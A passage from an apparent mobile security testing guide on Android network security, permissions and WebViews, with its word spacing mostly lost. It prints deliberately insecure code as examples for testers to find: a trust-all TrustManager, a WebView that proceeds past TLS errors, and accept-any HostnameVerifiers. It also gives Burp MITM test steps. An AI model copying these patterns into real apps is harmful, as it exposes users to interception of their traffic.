(e.g.,thosethatacceptanycertificate)tofacilitatethedevelopmentprocess,andsometimestheseweaksolutionsmake itintotheproductionversion,potentiallyexposinguserstoman-in-the-middleattacks. Twokeyissuesshouldbeaddressed: • Verifythatacertificatecomesfromatrustedsource,i.e.atrustedCA(CertificateAuthority). • Determinewhethertheendpointserverpresentstherightcertificate. Makesurethatthehostnameandthecertificateitselfareverifiedcorrectly. Examplesandcommonpitfallsareavailable intheofficialAndroiddocumentation. SearchthecodeforexamplesofTrustManagerandHostnameVerifierusage. In thesectionsbelow,youcanfindexamplesofthekindofinsecureusagethatyoushouldlookfor. Notethat fromAndroid8.0(API level 26) onward, thereis no supportfor SSLv3 andHttpsURLConnection willno longerperformafallbacktoaninsecureTLS/SSLprotocol. Verifying the Target SDK Version Applications targeting Android 7.0 (API level 24) or higher will use a default Network Security Configuration that doesn’t trust any user supplied CAs, reducing the possibility of MITM attacks by luring users to install malicious CAs. DecodetheappusingapktoolandverifythatthetargetSdkVersioninapktool.ymlisequaltoorhigherthan24. greptargetSdkVersionUnCrackable-Level3/apktool.yml targetSdkVersion:'28' However, even if targetSdkVersion >=24, the developer can disable default protections by using a custom Network Security Configuration defining a custom trust anchor forcing the app to trust user supplied CAs. See “Analyzing CustomTrustAnchors”. Analyzing Custom Trust Anchors Search for the Network Security Configuration file and inspect any custom <trust-anchors> defining <certificates src="user">(whichshouldbeavoided). Youshouldcarefullyanalyzetheprecedenceofentries: • Ifavalueisnotsetina<domain-config>entryorinaparent<domain-config>,theconfigurationsinplacewillbe basedonthe<base-config> • Ifnotdefinedinthisentry,thedefaultconfigurationswillbeused. TakealookatthisexampleofaNetworkSecurityConfigurationforanapptargetingAndroid9(APIlevel28): 239\n<?xml version="1.0" encoding="utf-8"?> <network-security-config> <domain-config> <domain includeSubdomains="false">owasp.org</domain> <trust-anchors> <certificates src="system" /> <certificates src="user" /> </trust-anchors> </domain-config> </network-security-config> Someobservations: • There’sno<base-config>,meaningthatthedefaultconfigurationforAndroid9(APIlevel28)orhigherwillbeused forallotherconnections(onlysystemCAwillbetrustedinprinciple). • However,the<domain-config>overridesthedefaultconfigurationallowingtheapptotrustbothsystemanduser CAsfortheindicated<domain>(owasp.org). • Thisdoesn’taffectsubdomainsbecauseofincludeSubdomains="false". PuttingalltogetherwecantranslatetheaboveNetworkSecurityConfigurationto: “theapptrustssystemanduserCAs fortheowasp.orgdomain,excludingitssubdomains. ForanyotherdomainstheappwilltrustthesystemCAsonly”. Verifying the Server Certificate TrustManagerisameansofverifyingconditionsnecessaryforestablishingatrustedconnectioninAndroid. Thefollowing conditionsshouldbecheckedatthispoint: • HasthecertificatebeensignedbyatrustedCA? • Hasthecertificateexpired? • Isthecertificateself-signed? Thefollowingcodesnippetissometimesusedduringdevelopmentandwillacceptanycertificate,overwritingthefunctions checkClientTrusted,checkServerTrusted,andgetAcceptedIssuers. Suchimplementationsshouldbeavoided,and, iftheyarenecessary,theyshouldbeclearlyseparatedfromproductionbuildstoavoidbuilt-insecurityflaws. TrustManager[]trustAllCerts =newTrustManager[]{ newX509TrustManager(){ @Override public X509Certificate[]getAcceptedIssuers(){ return newjava.security.cert.X509Certificate[]{}; } @Override public void checkClientTrusted(X509Certificate[]chain,StringauthType) throws CertificateException { } @Override public void checkServerTrusted(X509Certificate[]chain,StringauthType) throws CertificateException { } } }; //SSLContextcontext context.init(null,trustAllCerts,newSecureRandom()); WebView Server Certificate Verification Sometimes applications use a WebView to render the website associated with the application. This is true of HTML/JavaScript-basedframeworkssuchasApacheCordova,whichusesaninternalWebViewforapplicationinteraction. When a WebView is used, the mobile browser performs the server certificate validation. Ignoring any TLS error that occurswhentheWebViewtriestoconnecttotheremotewebsiteisabadpractice. The following code will ignore TLS issues, exactly like the WebViewClient custom implementation provided to the Web- View: 240\nWebViewmyWebView =(WebView)findViewById(R.id.webview); myWebView.setWebViewClient(newWebViewClient(){ @Override public void onReceivedSslError(WebViewview,SslErrorHandlerhandler,SslErrorerror){ //IgnoreTLScertificateerrorsandinstructtheWebViewClienttoloadthewebsite handler.proceed(); } }); Apache Cordova Certificate Verification ImplementationoftheApacheCordovaframework’sinternalWebViewusagewillignoreTLSerrorsinthemethodonRe- ceivedSslErroriftheflagandroid:debuggableisenabledintheapplicationmanifest. Therefore, makesurethatthe appisnotdebuggable. Seethetestcase“TestingIftheAppisDebuggable”. Hostname Verification Anothersecurityflawinclient-sideTLSimplementationsisthelackofhostnameverification. Developmentenvironments usuallyuseinternaladdressesinsteadofvaliddomainnames,sodevelopersoftendisablehostnameverification(orforce an application to allow any hostname) and simply forget to change it when their application goes to production. The followingcodedisableshostnameverification: final static HostnameVerifierNO_VERIFY =newHostnameVerifier(){ public boolean verify(Stringhostname,SSLSessionsession){ return true; } }; Withabuilt-inHostnameVerifier,acceptinganyhostnameispossible: HostnameVerifierNO_VERIFY =org.apache.http.conn.ssl.SSLSocketFactory .ALLOW_ALL_HOSTNAME_VERIFIER; Makesurethatyourapplicationverifiesahostnamebeforesettingatrustedconnection. Dynamic Analysis WhentestinganapptargetingAndroid7.0(APIlevel24)orhigheritshouldbeeffectivelyapplyingtheNetworkSecurity Configurationandyoushouldn’tabletoseethedecryptedHTTPStrafficatfirst. However, iftheapptargetsAPIlevels below24,theappwillautomaticallyaccepttheinstalledusercertificates. TotestimpropercertificateverificationlaunchaMITMattackusinganinterceptionproxysuchasBurp. Trythefollowing options: • Self-signedcertificate: 1. InBurp,gototheProxytabandselecttheOptionstab. 2. GototheProxyListenerssection,highlightyourlistener,andclickEdit. 3. GototheCertificatetab,checkUseaself-signedcertificate,andclickOk. 4. Runyourapplication. Ifyou’reabletoseeHTTPStraffic,yourapplicationisacceptingself-signedcertificates. • AcceptingcertificateswithanuntrustedCA: 1. InBurp,gototheProxytabandselecttheOptionstab. 2. GototheProxyListenerssection,highlightyourlistener,andclickEdit. 3. GototheCertificatetab,checkGenerateaCA-signedcertificatewithaspecifichostname,andtype inthebackendserver’shostname. 4. Run your application. If you’re able to see HTTPS traffic, your application is accepting certificates with an untrustedCA. • Acceptingincorrecthostnames: 1. InBurp,gototheProxytabandselecttheOptionstab. 241\n2. GototheProxyListenerssection,highlightyourlistener,andclickEdit. 3. GototheCertificatetab,checkGenerateaCA-signedcertificatewithaspecifichostname,andtype inaninvalidhostname,e.g.,example.org. 4. Runyourapplication. Ifyou’reabletoseeHTTPStraffic,yourapplicationisacceptingallhostnames. Ifyou’restillnotabletoseeanydecryptedHTTPStraffic,yourapplicationmightbeimplementingcertificatepinning. Testing the Security Provider Platform: android MASVSV1: MSTG-NETWORK-6 MASVSV2: MASVS-NETWORK-1 Overview Static Analysis ApplicationsbasedontheAndroidSDKshoulddependonGooglePlayServices. Forexample,inthegradlebuildfile,youwill findcompile'com.google.android.gms:play-services-gcm:x.x.x'inthedependenciesblock. Youneedtomakesure thattheProviderInstallerclassiscalledwitheitherinstallIfNeededorinstallIfNeededAsync. ProviderInstaller needstobecalledbyacomponentoftheapplicationasearlyaspossible. Exceptionsthrownbythesemethodsshould becaughtandhandledcorrectly. Iftheapplicationcannotpatchitssecurityprovider,itcaneitherinformtheAPIofits lesssecurestateorrestrictuseractions(becauseallHTTPStrafficshouldbedeemedriskierinthissituation). Ifyouhaveaccesstothesourcecode, checkiftheapphandleanyexceptionsrelatedtothesecurityproviderupdates properly, and if it reports to the backend when the application is working with an unpatched security provider. The AndroidDeveloperdocumentationprovidesdifferentexamplesshowinghowtoupdatetheSecurityProvidertoprevent SSLexploits. Lastly,makesurethatNDK-basedapplicationsbindonlytoarecentandproperlypatchedlibrarythatprovidesSSL/TLS functionality. Dynamic Analysis Whenyouhavethesourcecode: • Runtheapplicationindebugmode,thencreateabreakpointwheretheappwillfirstcontacttheendpoint(s). • RightclickthehighlightedcodeandselectEvaluate Expression. • TypeSecurity.getProviders()andpressenter. • ChecktheprovidersandtrytofindGmsCore_OpenSSL,whichshouldbethenewtop-listedprovider. Whenyoudonothavethesourcecode: • UseXposedtohookintothejava.securitypackage,thenhookintojava.security.Securitywiththemethod getProviders(withnoarguments). ThereturnvaluewillbeanarrayofProvider. • DeterminewhetherthefirstproviderisGmsCore_OpenSSL. Testing Data Encryption on the Network Platform: android MASVSV1: MSTG-NETWORK-1 MASVSV2: MASVS-NETWORK-1 242\nOverview Static Analysis Testing Network Requests over Secure Protocols First, you should identify all network requests in the source code and ensure that no plain HTTP URLs are used. Make surethatsensitiveinformationissentoversecurechannelsbyusingHttpsURLConnectionorSSLSocket(forsocket-level communicationusingTLS). Testing Network API Usage Next,evenwhenusingalow-levelAPIwhichissupposedtomakesecureconnections(suchasSSLSocket),beawarethat ithastobesecurelyimplemented. Forinstance,SSLSocketdoesn’tverifythehostname. UsegetDefaultHostnameV- erifiertoverifythehostname. TheAndroiddeveloperdocumentationincludesacodeexample. Testing for Cleartext Traffic Next,youshouldensurethattheappisnotallowingcleartextHTTPtraffic. SinceAndroid9(APIlevel28)cleartextHTTP trafficisblockedbydefault(thankstothedefaultNetworkSecurityConfiguration)buttherearemultiplewaysinwhich anapplicationcanstillsendit: • Setting the android:usesCleartextTraffic attribute of the <application> tag in the AndroidManifest.xml file. NotethatthisflagisignoredincasetheNetworkSecurityConfigurationisconfigured. • Configuring the Network Security Configuration to enable cleartext traffic by setting the cleartextTrafficPer- mittedattributetotrueon<domain-config>elements. • Usinglow-levelAPIs(e.g.Socket)tosetupacustomHTTPconnection. • Usingacross-platformframework(e.g.Flutter,Xamarin,...),asthesetypicallyhavetheirownimplementationsfor HTTPlibraries. Alloftheabovecasesmustbecarefullyanalyzedasawhole. Forexample,eveniftheappdoesnotpermitcleartexttraffic initsAndroidManifestorNetworkSecurityConfiguration,itmightactuallystillbesendingHTTPtraffic. Thatcouldbethe caseifit’susingalow-levelAPI(forwhichNetworkSecurityConfigurationisignored)orabadlyconfiguredcross-platform framework. Formoreinformationrefertothearticle“SecuritywithHTTPSandSSL”. Dynamic Analysis Intercept the tested app’s incoming and outgoing network traffic and make sure that this traffic is encrypted. You can interceptnetworktrafficinanyofthefollowingways: • CaptureallHTTP(S)andWebsockettrafficwithaninterceptionproxylikeOWASPZAPorBurpSuiteandmakesure allrequestsaremadeviaHTTPSinsteadofHTTP. • InterceptionproxieslikeBurpandOWASPZAPwillshowHTTP(S)trafficonly. Youcan,however,useaBurpplugin suchasBurp-non-HTTP-Extensionorthetoolmitm-relaytodecodeandvisualizecommunicationviaXMPPandother protocols. SomeapplicationsmaynotworkwithproxieslikeBurpandOWASPZAPbecauseofCertificatePinning. Insucha scenario,pleasecheck“TestingCustomCertificateStoresandCertificatePinning”. Formoredetailsreferto: • “InterceptingTrafficontheNetworkLayer”fromchapter“MobileAppNetworkCommunication” • “SettingupaNetworkTestingEnvironment”fromchapter“AndroidBasicSecurityTesting” Testing the TLS Settings 243\nPlatform: android MASVSV1: MSTG-NETWORK-2 MASVSV2: MASVS-NETWORK-1 Overview Refertosection“VerifyingtheTLSSettings”inchapter“MobileAppNetworkCommunication”fordetails. 244\nAndroid Platform APIs Overview App Permissions Androidassignsadistinctsystemidentity(LinuxuserIDandgroupID)toeveryinstalledapp. BecauseeachAndroidapp operatesinaprocesssandbox,appsmustexplicitlyrequestaccesstoresourcesanddatathatareoutsidetheirsandbox. They request this access by declaring the permissions they need to use system data and features. Depending on how sensitiveorcriticalthedataorfeatureis,theAndroidsystemwillgrantthepermissionautomaticallyorasktheuserto approvetherequest. To enhance user privacy and mitigate privacy risks, it is crucial for Android apps to minimize permission requests and only request access to sensitive information when absolutely necessary. The Android developer documentation offers valuableinsightsandbestpracticestohelpappsachievethesameleveloffunctionalitywithoutrequiringdirectaccess tosensitiveresources: • Minimizeyourpermissionrequests • Apppermissionsbestpractices • PermissionsandAPIsthatAccessSensitiveInformation Android permissions can be classified into distinct categories depending on the extent of restricted data access and permittedactionsthattheygranttoanapp. Thisclassificationincludestheso-called“ProtectionLevel”asshownonthe permissionsAPIreferencepageandAndroidManifest.xmlSourceDefinitions. • Install-time permissions: grant limited access to restricted data or let the app perform restricted actions that minimally affect the system or other apps. They are granted automatically at installation time (Android 6.0 (API level23)orhigher). – ProtectionLevel: normal. Grantsappsaccesstoisolatedapplication-levelfeatureswithminimalrisktoother apps,theuser,andthesystem. Example: android.permission.INTERNET – ProtectionLevel: signature. Grantedonlytoappssignedwiththesamecertificateastheoneusedtosign thedeclaringapp. Example: android.permission.ACCESS_MOCK_LOCATION – ProtectionLevel: systemOrSignature. Reservedforsystem-embeddedappsorthosesignedwiththesame certificate as the one used to sign the declaring app. Example: android.permission.ACCESS_DOWNLOAD_- MANAGER.Oldsynonymforsignature|privileged. DeprecatedinAPIlevel23. • Runtimepermissions: requirepromptingtheuseratruntimeforexplicitapproval. – Protection Level: dangerous. Grant additional access to restricted data or let the app perform restricted actionsthatmoresubstantiallyaffectthesystemandotherapps. • Specialpermissions: requiretheusertonavigatetoSettings>Apps>Specialappaccessandgiveexplicit consent. – ProtectionLevel: appop. Grantaccesstosystemresourcesthatareparticularlysensitivesuchasdisplaying anddrawingoverotherappsoraccessingallstoragedata. • Custompermissionsinordertosharetheirownresourcesandcapabilitieswithotherapps. – ProtectionLevel: normal,signatureordangerous. Independently from the assigned Protection Level, it is important to consider the risk that a permission might be pos- ingconsideringtheadditionalguardedcapabilities, thisisespeciallyimportantforpreloadedapps. Thefollowingtable presentsarepresentativesetofAndroidpermissionscategorizedbyassociatedriskasdefinedinthispaperwhichlever- agesthesetof(privileged)permissionsandentrancepointstoanapptoestimateitsattacksurface. RiskCategory Permissions ProtectionLevel ASTRONOMICAL android.permission.INSTALL_PACKAGES signature 245\nRiskCategory Permissions ProtectionLevel CRITICAL android.permission.COPY_PROTECTED_DATA signature android.permission.WRITE_SECURE_SETTINGS signature android.permission.READ_FRAME_BUFFER signature android.permission.MANAGE_CA_CERTIFICATES signature android.permission.MANAGE_APP_OPS_MODES signature android.permission.GRANT_RUNTIME_PERMISSIONS signature android.permission.DUMP signature android.permission.CAMERA dangerous android.permission.SYSTEM_CAMERA systemOrSignature android.permission.MANAGE_PROFILE_AND_DEVICE_OWNERS signature android.permission.MOUNT_UNMOUNT_FILESYSTEMS signature HIGH android.permission.INSTALL_GRANT_RUNTIME_PERMISSIONS signature android.permission.READ_SMS dangerous android.permission.WRITE_SMS normal android.permission.RECEIVE_MMS dangerous android.permission.SEND_SMS_NO_CONFIRMATION signature android.permission.RECEIVE_SMS dangerous android.permission.READ_LOGS signature android.permission.READ_PRIVILEGED_PHONE_STATE signature android.permission.LOCATION_HARDWARE signature android.permission.ACCESS_FINE_LOCATION dangerous android.permission.ACCESS_BACKGROUND_LOCATION dangerous android.permission.BIND_ACCESSIBILITY_SERVICE signature android.permission.ACCESS_WIFI_STATE normal com.android.voicemail.permission.READ_VOICEMAIL signature android.permission.RECORD_AUDIO dangerous android.permission.CAPTURE_AUDIO_OUTPUT signature android.permission.ACCESS_NOTIFICATIONS signature android.permission.INTERACT_ACROSS_USERS_FULL signature android.permission.BLUETOOTH_PRIVILEGED signature android.permission.GET_PASSWORD signature android.permission.INTERNAL_SYSTEM_WINDOW signature MEDIUM android.permission.ACCESS_COARSE_LOCATION dangerous android.permission.CHANGE_COMPONENT_ENABLED_STATE signature android.permission.READ_CONTACTS dangerous android.permission.WRITE_CONTACTS dangerous android.permission.CONNECTIVITY_INTERNAL signature android.permission.ACCESS_MEDIA_LOCATION dangerous android.permission.READ_EXTERNAL_STORAGE dangerous android.permission.WRITE_EXTERNAL_STORAGE dangerous android.permission.SYSTEM_ALERT_WINDOW signature android.permission.READ_CALL_LOG dangerous 246\nRiskCategory Permissions ProtectionLevel android.permission.WRITE_CALL_LOG dangerous android.permission.INTERACT_ACROSS_USERS signature android.permission.MANAGE_USERS signature android.permission.READ_CALENDAR dangerous android.permission.BLUETOOTH_ADMIN normal android.permission.BODY_SENSORS dangerous LOW android.permission.DOWNLOAD_WITHOUT_NOTIFICATION normal android.permission.PACKAGE_USAGE_STATS signature android.permission.MASTER_CLEAR signature android.permission.DELETE_PACKAGES normal android.permission.GET_PACKAGE_SIZE normal android.permission.BLUETOOTH normal android.permission.DEVICE_POWER signature NONE android.permission.ACCESS_NETWORK_STATE normal android.permission.RECEIVE_BOOT_COMPLETED normal android.permission.WAKE_LOCK normal android.permission.FLASHLIGHT normal android.permission.VIBRATE normal android.permission.WRITE_MEDIA_STORAGE signature android.permission.MODIFY_AUDIO_SETTINGS normal Notethatthiscategorizationcanchangeovertime. Thepapergivesusanexampleofthat: PriortoAndroid10, theREAD_PHONE_STATEpermissionwouldbeclassifiedasHIGH,duetothepermanentdevice identifiers (e.g. (IMEI/MEID, IMSI, SIM, and build serial) that it guards. However, starting from Android 10, a bulk of the sensitive information that can be used for tracking has been moved, refactored or rescoped into a new permissioncalledREAD_PRIVILEGED_PHONE_STATE,puttingthenewpermissionintheHIGHcategory,butresulting intheREAD_PHONE_STATEpermissionmovingtoLOW. Permission Changes per API Level Android8.0(APIlevel26)Changes: ThefollowingchangesaffectallappsrunningonAndroid8.0(APIlevel26),eventothoseappstargetinglowerAPIlevels. • Contacts provider usage stats change: when an app requests the READ_CONTACTS permission, queries for contact’susagedatawillreturnapproximationsratherthanexactvalues(theauto-completeAPIisnotaffectedby thischange). AppstargetingAndroid8.0(APIlevel26)orhigherareaffectedbythefollowing: • Account access and discoverability improvements: Appscannolongergetaccesstouseraccountsonlyby havingtheGET_ACCOUNTSpermissiongranted,unlesstheauthenticatorownstheaccountsortheusergrantsthat access. • New telephony permissions: the following permissions (classified as dangerous) are now part of the PHONE permissionsgroup: – The ANSWER_PHONE_CALLS permission allows to answer incoming phone calls programmatically (via accep- tRingingCall). 247\n– TheREAD_PHONE_NUMBERSpermissiongrantsreadaccesstothephonenumbersstoredinthedevice. • Restrictions when granting dangerous permissions: Dangerous permissions are classified into permission groups(e.g.theSTORAGEgroupcontainsREAD_EXTERNAL_STORAGEandWRITE_EXTERNAL_STORAGE).BeforeAndroid 8.0 (API level 26), it was sufficient to request one permission of the group in order to get all permissions of that group also granted at the same time. This has changed starting at Android 8.0 (API level 26): whenever an app requests a permission at runtime, the system will grant exclusively that specific permission. However, note that allsubsequentrequestsforpermissionsinthatpermissiongroupwillbeautomaticallygrantedwithout showingthepermissionsdialogtotheuser. SeethisexamplefromtheAndroiddeveloperdocumentation: SupposeanapplistsbothREAD_EXTERNAL_STORAGEandWRITE_EXTERNAL_STORAGEinitsmanifest. The apprequestsREAD_EXTERNAL_STORAGEandtheusergrantsit. IftheapptargetsAPIlevel25orlower,the systemalsograntsWRITE_EXTERNAL_STORAGEatthesametime,becauseitbelongstothesameSTORAGE permissiongroupandisalsoregisteredinthemanifest. IftheapptargetsAndroid8.0(APIlevel26),thesystem grants only READ_EXTERNAL_STORAGE at that time; however, if the app later requests WRITE_EXTERNAL_- STORAGE,thesystemimmediatelygrantsthatprivilegewithoutpromptingtheuser. YoucanseethelistofpermissiongroupsintheAndroiddeveloperdocumentation. Tomakethisabitmoreconfusing, Googlealsowarnsthatparticularpermissionsmightbemovedfromonegrouptoanotherinfutureversionsofthe AndroidSDKandtherefore,thelogicoftheappshouldn’trelyonthestructureofthesepermissiongroups. Thebest practiceistoexplicitlyrequesteverypermissionwheneverit’sneeded. Android9(APILevel28)Changes: ThefollowingchangesaffectallappsrunningonAndroid9,eventothoseappstargetingAPIlevelslowerthan28. • Restricted access to call logs: READ_CALL_LOG, WRITE_CALL_LOG, and PROCESS_OUTGOING_CALLS (dangerous) permissionsare moved fromPHONE to the new CALL_LOG permissiongroup. This means that being able to make phonecalls(e.g.byhavingthepermissionsofthePHONEgroupgranted)isnotsufficienttogetaccesstothecall logs. • Restricted access to phone numbers: apps wanting to read the phone number require the READ_CALL_LOG permissionwhenrunningonAndroid9(APIlevel28). • RestrictedaccesstoWi-Filocationandconnectioninformation: SSIDandBSSIDvaluescannotberetrieved (e.g.viaWifiManager.getConnectionInfounlessallofthefollowingistrue: – TheACCESS_FINE_LOCATIONorACCESS_COARSE_LOCATIONpermission. – TheACCESS_WIFI_STATEpermission. – Locationservicesareenabled(underSettings->Location). AppstargetingAndroid9(APIlevel28)orhigherareaffectedbythefollowing: • Buildserialnumberdeprecation: device’shardwareserialnumbercannotberead(e.g.viaBuild.getSerial) unlesstheREAD_PHONE_STATE(dangerous)permissionisgranted. Android10(APIlevel29)Changes: Android10(APIlevel29)introducesseveraluserprivacyenhancements. Thechangesregardingpermissionsaffecttoall appsrunningonAndroid10(APIlevel29),includingthosetargetinglowerAPIlevels. • RestrictedLocationaccess: newpermissionoptionforlocationaccess“onlywhileusingtheapp”. • Scopedstoragebydefault: appstargetingAndroid10(APIlevel29)don’tneedtodeclareanystoragepermission toaccesstheirfilesintheappspecificdirectoryinexternalstorageaswellasforfilescreatesfromthemediastore. • Restricted access to screen contents: READ_FRAME_BUFFER,CAPTURE_VIDEO_OUTPUT,andCAPTURE_SECURE_- VIDEO_OUTPUT permissions are now signature-access only, which prevents silent access to the device’s screen contents. • User-facing permission check on legacy apps: when running an app targeting Android 5.1 (API level 22) or lowerforthefirsttime,userswillbepromptedwithapermissionsscreenwheretheycanrevokeaccesstospecific legacypermissions(whichpreviouslywouldbeautomaticallygrantedatinstallationtime). Permission Enforcement ActivityPermissionEnforcement: 248\nPermissions are applied via android:permission attribute within the <activity> tag in the manifest. These permis- sionsrestrictwhichapplicationscanstartthatActivity. ThepermissionischeckedduringContext.startActivityand Activity.startActivityForResult. NotholdingtherequiredpermissionresultsinaSecurityExceptionbeingthrown fromthecall. ServicePermissionEnforcement: Permissions applied via android:permission attribute within the <service> tag in the manifest restrict who can start orbindtotheassociatedService. ThepermissionischeckedduringContext.startService,Context.stopServiceand Context.bindService. NotholdingtherequiredpermissionresultsinaSecurityExceptionbeingthrownfromthecall. BroadcastPermissionEnforcement: Permissionsappliedviaandroid:permissionattributewithinthe<receiver>tagrestrictaccesstosendbroadcaststothe associatedBroadcastReceiver. TheheldpermissionsarecheckedafterContext.sendBroadcastreturns, whiletrying todeliverthesentbroadcasttothegivenreceiver. Notholdingtherequiredpermissionsdoesn’tthrowanexception,the resultisanunsentbroadcast. ApermissioncanbesuppliedtoContext.registerReceivertocontrolwhocanbroadcasttoaprogrammaticallyregis- teredreceiver. Goingtheotherway,apermissioncanbesuppliedwhencallingContext.sendBroadcasttorestrictwhich broadcastreceiversareallowedtoreceivethebroadcast. Notethatbothareceiverandabroadcastercanrequireapermission. Whenthishappens,bothpermissionchecksmust passfortheintenttobedeliveredtotheassociatedtarget. Formoreinformation,pleasereferencethesection“Restricting broadcastswithpermissions”intheAndroidDevelopersDocumentation. ContentProviderPermissionEnforcement: Permissions applied via android:permission attribute within the <provider> tag restrict access to data in a Content- Provider. Content providers have an important additional security facility called URI permissions which is described next. Unlike the other components, ContentProviders have two separate permission attributes that can be set, an- droid:readPermissionrestrictswhocanreadfromtheprovider,andandroid:writePermissionrestrictswhocanwrite toit. IfaContentProviderisprotectedwithbothreadandwritepermissions,holdingonlythewritepermissiondoesnot alsograntreadpermissions. PermissionsarecheckedwhenyoufirstretrieveaproviderandasoperationsareperformedusingtheContentProvider. Us- ingContentResolver.queryrequiresholdingthereadpermission;usingContentResolver.insert,ContentResolver. update, ContentResolver.delete requires the write permission. A SecurityException will be thrown from the call if properpermissionsarenotheldinallthesecases. ContentProviderURIPermissions: Thestandardpermissionsystemisnotsufficientwhenbeingusedwithcontentproviders. Forexampleacontentprovider maywanttolimitpermissionstoREADpermissionsinordertoprotectitself,whileusingcustomURIstoretrieveinforma- tion. AnapplicationshouldonlyhavethepermissionforthatspecificURI. The solution is per-URI permissions. When starting or returning a result from an activity, the method can set Intent. FLAG_GRANT_READ_URI_PERMISSIONand/orIntent.FLAG_GRANT_WRITE_URI_PERMISSION.Thisgrantspermissiontothe activityforthespecificURIregardlessifithaspermissionstoaccesstodatafromthecontentprovider. This allows a common capability-style model where user interaction drives ad-hoc granting of fine-grained permission. This can be a key facility for reducing the permissions needed by apps to only those directly related to their behavior. Withoutthismodelinplacemalicioususersmayaccessothermember’semailattachmentsorharvestcontactlistsfor futureuseviaunprotectedURIs. Inthemanifesttheandroid:grantUriPermissionsattributeorthenodehelprestrict theURIs. HereyoucanfindmoreinformationaboutAPIsrelatedtoURIPermissions: • grantUriPermission • revokeUriPermission • checkUriPermission Custom Permissions Androidallowsappstoexposetheirservices/componentstootherapps. Custompermissionsarerequiredforappaccess totheexposedcomponents. YoucandefinecustompermissionsinAndroidManifest.xmlbycreatingapermissiontag withtwomandatoryattributes: android:nameandandroid:protectionLevel. 249\nIt is crucial to create custom permissions that adhere to the Principle of Least Privilege: permission should be defined explicitlyforitspurpose,withameaningfulandaccuratelabelanddescription. BelowisanexampleofacustompermissioncalledSTART_MAIN_ACTIVITY,whichisrequiredwhenlaunchingtheTEST_- ACTIVITYActivity. Thefirstcodeblockdefinesthenewpermission,whichisself-explanatory. Thelabeltagisasummaryofthepermission, andthedescriptionisamoredetailedversionofthesummary. Youcansettheprotectionlevelaccordingtothetypesof permissionsthatwillbegranted. Onceyou’vedefinedyourpermission,youcanenforceitbyaddingittotheapplication’s manifest. Inourexample,thesecondblockrepresentsthecomponentthatwearegoingtorestrictwiththepermission wecreated. Itcanbeenforcedbyaddingtheandroid:permissionattributes. <permission android:name="com.example.myapp.permission.START_MAIN_ACTIVITY" android:label="StartActivityinmyapp" android:description="Allowtheapptolaunchtheactivityofmyappapp,anyappyougrantthispermissionwillbeable tolaunchmainactivitybymyapp ↪ app." android:protectionLevel="normal" /> <activity android:name="TEST_ACTIVITY" android:permission="com.example.myapp.permission.START_MAIN_ACTIVITY"> <intent-filter> <action android:name="android.intent.action.MAIN" /> <category android:name="android.intent.category.LAUNCHER" /> </intent-filter> </activity> OncethepermissionSTART_MAIN_ACTIVITYhasbeencreated, appscanrequestitviatheuses-permissiontaginthe AndroidManifest.xmlfile. AnyapplicationgrantedthecustompermissionSTART_MAIN_ACTIVITYcanthenlaunchthe TEST_ACTIVITY. Please note <uses-permission android:name="myapp.permission.START_MAIN_ACTIVITY" /> must bedeclaredbeforethe<application>oranexceptionwilloccuratruntime. Pleaseseetheexamplebelowthatisbased onthepermissionoverviewandmanifest-intro. <manifest> <uses-permission android:name="com.example.myapp.permission.START_MAIN_ACTIVITY" /> <application> <activity> </activity> </application> </manifest> We recommend using a reverse-domain annotation when registering a permission, as in the example above (e.g. com. domain.application.permission)inordertoavoidcollisionswithotherapplications. WebViews URL Loading in WebViews WebViews are Android’s embedded components which allow your app to open web pages within your application. In additiontomobileappsrelatedthreats,WebViewsmayexposeyourapptocommonwebthreats(e.g.XSS,OpenRedirect, etc.). OneofthemostimportantthingstodowhentestingWebViewsistomakesurethatonlytrustedcontentcanbeloaded init. Anynewlyloadedpagecouldbepotentiallymalicious,trytoexploitanyWebViewbindingsortrytophishtheuser. Unlessyou’redevelopingabrowserapp,usuallyyou’dliketorestrictthepagesbeingloadedtothedomainofyourapp. A goodpracticeistopreventtheuserfromevenhavingthechancetoinputanyURLsinsideWebViews(whichisthedefault onAndroid)nornavigateoutsidethetrusteddomains. Evenwhennavigatingontrusteddomainsthere’sstilltheriskthat theusermightencounterandclickonotherlinkstountrustworthycontent(e.g.ifthepageallowsforotheruserstopost comments). Inaddition,somedevelopersmightevenoverridesomedefaultbehaviorwhichcanbepotentiallydangerous fortheuser. SafeBrowsing API Toprovideasaferwebbrowsingexperience, Android8.1(APIlevel27)introducestheSafeBrowsing API,whichallows yourapplicationtodetectURLsthatGooglehasclassifiedasaknownthreat. 250\nBydefault, WebViewsshowawarningtousersaboutthesecurityriskwiththeoptiontoloadtheURLorstopthepage fromloading. WiththeSafeBrowsingAPIyoucancustomizeyourapplication’sbehaviorbyeitherreportingthethreatto SafeBrowsingorperformingaparticularactionsuchasreturningbacktosafetyeachtimeitencountersaknownthreat. PleasechecktheAndroidDevelopersdocumentationforusageexamples. YoucanusetheSafeBrowsingAPIindependentlyfromWebViewsusingtheSafetyNetlibrary,whichimplementsaclient for Safe Browsing Network Protocol v4. SafetyNet allows you to analyze all the URLs that your app is supposed load. YoucancheckURLswithdifferentschemes(e.g.http,file)sinceSafeBrowsingisagnostictoURLschemes,andagainst TYPE_POTENTIALLY_HARMFUL_APPLICATIONandTYPE_SOCIAL_ENGINEERINGthreattypes. WhensendingURLsorfilestobecheckedforknownthreatsmakesuretheydon’tcontainsensitivedatawhichcould compromiseauser’sprivacy,orexposesensitivecontentfromyourapplication. Virus Total API VirusTotalprovidesanAPIforanalyzingURLsandlocalfilesforknownthreats. TheAPIReferenceisavailableonVirus Totaldeveloperspage. JavaScript Execution in WebViews JavaScriptcanbeinjectedintowebapplicationsviareflected,stored,orDOM-basedCross-SiteScripting(XSS).Mobileapps are executed in a sandboxed environment and don’t have this vulnerability when implemented natively. Nevertheless, WebViews may be part of a native app to allow web page viewing. Every app has its own WebView cache, which isn’t shared with the native Browser or other apps. On Android, WebViews use the WebKit rendering engine to display web pages,butthepagesarestrippeddowntominimalfunctions,forexample,pagesdon’thaveaddressbars. IftheWebView implementationistoolaxandallowsusageofJavaScript,JavaScriptcanbeusedtoattacktheappandgainaccesstoits data. WebView Protocol Handlers SeveraldefaultschemasareavailableforAndroidURLs. TheycanbetriggeredwithinaWebViewwiththefollowing: • http(s):// • file:// • tel:// WebViewscanloadremotecontentfromanendpoint,buttheycanalsoloadlocalcontentfromtheappdatadirectoryor externalstorage. Ifthelocalcontentisloaded,theusershouldn’tbeabletoinfluencethefilenameorthepathusedto loadthefile,andusersshouldn’tbeabletoedittheloadedfile. Java Objects Exposed Through WebViews AndroidoffersawayforJavaScriptexecutioninaWebViewtocallandusenativefunctionsofanAndroidapp(annotated with @JavascriptInterface) by using the 